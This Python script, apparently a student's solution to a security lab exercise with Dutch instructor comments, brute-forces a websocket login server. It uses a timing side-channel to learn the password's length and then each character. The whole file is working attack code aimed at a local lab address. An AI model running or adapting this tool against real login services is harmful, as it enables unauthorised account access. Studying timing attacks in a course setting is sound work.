"""
This module contains the implementation of a client that communicates with a server to attempt
logins with different username and password combinations. It uses the websockets library for 
communication, and asyncio for handling asynchronous tasks.

The client_stub function is the main function that sends login attempts to the server and 
receives responses. It uses a 'while True' loop to ensure that singular network or socket errors 
do not cause the entire code to fail.

The module also includes various utility functions for handling tasks such as clearing the 
terminal screen, saving output to a text file, and printing statistical information about 
response times.

This script is designed to be run as a standalone program, with the main entry point being the 
'main' function at the bottom of the file.

Note: This script is intended for educational purposes only. Do not use it for illegal activities.
"""

import socket, sys, asyncio, websockets, json, time, string, operator, statistics
import os
import statistics
import string
import shutil

async def client_stub(username, password, ip):
    """Handle sending and receiving logins to/from the server.
    'while True' structure prevents singular network/socket
    errors from causing full code to fail.

    --- laat deze functie onaangetast ---
    
    Parameters
    ----------
        username -- string of student ID for login attempt
        password -- string of password for login attempt

    Returns
    -------
        reply -- string of server's response to login attempt
    """

    server_address = ip
    err_count=0
    while True:
        try:
            time_before = time.perf_counter()
            async with websockets.connect(server_address) as websocket:
                await websocket.send(json.dumps([username,password]))
                reply = await websocket.recv()
            time_after = time.perf_counter()
            time_delta = time_after-time_before
            if err_count != 0:
                print(err_count)
                err_count=0
            return json.loads(reply), time_delta
        except:
            err_count+=1
            continue


def call_server(username, password,ip):
    #clear_terminal()
    print('Sending login attempt for username: {} and password: {}'.format(username, password))
    """Send a login attempt to the server and return the response.

    --- deze functie mag je aanpassen ---
    
    Parameters
    ----------
        username -- string of student ID for login attempt
        password -- string of password for login attempt

    Returns
    -------
        reply -- string of server's response to login attempt
        (time_after-time_before) -- int of response time for attempt
    """
    
    reply, time_delta = asyncio.get_event_loop().\
            run_until_complete(client_stub(username,password,ip))
    #save_output_to_txt(reply+str(time_delta)+ enter)
    
    if reply[-15:] == 'Access Granted!':
        print('Correct password found: {}'.format(password))
    time.sleep(0.001) # Make sure to wait so as to not overload the server!
    
    return reply, time_delta


def print_stats(response_times):
    """Prints some statistical information about the latest
    round of login attempts. Purely superfluous and not used
    for any calculations.

    Parameters
    ----------
        response_times -- list of reponse times, sorted
            fastest to slowest
    """
    
    slowest = response_times[-1]
    sec_slowest = response_times[-2]
    min_diff = slowest - sec_slowest
    max_diff = slowest - response_times[0]
    avg_time = statistics.median(response_times)
    avg_diff_w_max = slowest - avg_time
    st_dev = statistics.stdev(response_times[:-1])
    st_dev_delay = statistics.stdev(response_times)
      
    print(f'Slowest response time: {round(slowest, 4)}')
    print(f'Difference with second-slowest: {round(min_diff, 4)}')
    print(f'Difference with fastest: {round(max_diff, 4)}')
    print(f'Median response time: {round(avg_time, 4)}')
    print(f'Difference from slowest time: {round(avg_diff_w_max, 4)}')
    print(f'Stdev w/o delay: {round(st_dev, 4)}')
    print(f'Stdev with delay: {round(st_dev_delay, 4)}')
    return


def find_real_password_length(password_length):
    """Finds the real length of the password for the given username."""
    # Read response times from the text file
    with open('output.txt', 'r') as f:
        lines = f.readlines()
        response_times = [float(line.split('=')[-1]) for line in lines]
    #group the response times into sets of 200 and calculate the average of each group
    response_time_groups = [response_times[i:i+200] for i in range(0, len(response_times), 200)]
    # Limit the number of groups to the user's input of password length
    response_time_groups = response_time_groups[:password_length]
    # Calculate and print the average response time for each group
    for i, group in enumerate(response_time_groups):
        print(f'Average response time for group {i+1}: {statistics.mean(group)}')
    #Find and print the highest response time of the groups and print the index of the group
    max_group = max(response_time_groups, key=statistics.mean)
    print(f'Group with highest average response time: {response_time_groups.index(max_group)+1}')
    real_length_of_password = response_time_groups.index(max_group)+1
    return real_length_of_password


def length_password(username, passwordlength,ip):
    """Finds the length of the password for the given username."""	
    resultaat = ""
    for i in range(passwordlength):
        call_server("","",ip)
        resultaat += "o"
        for x in range(200):
            
            if len(resultaat) > 0:
                reply,time_delta =call_server(username, resultaat,ip)

                save_output_to_txt('Sending login attempt for username: {} and password: {}'.format(username, resultaat)+ (" "*(passwordlength- len(resultaat)))+ ' response time = '+str(time_delta)+ '\n')
                #print finding password length but keep it on the same line
                print('Finding password length: {}'.format(len(resultaat)), end='\r')


def clear_terminal():
    """Clears the terminal screen. Purely for visual purposes.
    uses the cls for windows and clear for unix systems.
    """
    if sys.platform == 'win32':
        os.system('cls')
    else:
        os.system('clear')
    return


def save_output_to_txt(output):
    """Saves the output of the program to a text file.
    """
    with open('output.txt', 'a') as f:
        f.write(output)
    #close the file
    f.close()
    return


def find_password(username, real_length_of_password,ip):
    """Finds the password for the given username and password length."""
    password = 'a' * real_length_of_password
    for i in range(real_length_of_password):
        max_time = 0
        for char in string.ascii_lowercase + string.digits:
            times = []
            for _ in range(100):
                temp_password = password[:i] + char + password[i+1:]
                _, time_delta = call_server(username, temp_password,ip)
                times.append(time_delta)
            avg_time = statistics.mean(times)
            if avg_time > max_time:
                max_time = avg_time
                password = temp_password
    return password


def dotter():
    """"Dotting" function. Purely for visual purposes."""
    columns, _ = shutil.get_terminal_size()
    for _ in range(columns):
        print('.', end='', flush=True)
        time.sleep(0.1)
    return


def main():
    """Main function. Loops through all possible passwords
    and sends them to the server.

    Main function that orchestrates the brute-force attack.
    Takes user input for the username and maximum password length.
    Calls length_password to find the real length of the password.
    Calls find_real_password_length to determine the real length of the password.
    Calls find_password to find the actual password using a brute-force approach.
    """
    #server_address = "ws://127.0.0.1:3840"
    server_address = "ws://192.168.1.10:3840"
    ip = server_address
    # Clear the output.txt file
    open('output.txt', 'w').close()
    clear_terminal()
    print('Starting brute force attack on server...')
    dotter()
    clear_terminal()
    username = input("Enter username:")
    clear_terminal()
    passwordlength = int(input("Input max length of password: "))
    clear_terminal()
    length_password(username, passwordlength,ip)
    

    real_length_of_password = find_real_password_length(passwordlength)
    print(real_length_of_password)
    password = find_password(username, real_length_of_password,ip)
    print(password)

if __name__ == '__main__':
    main()



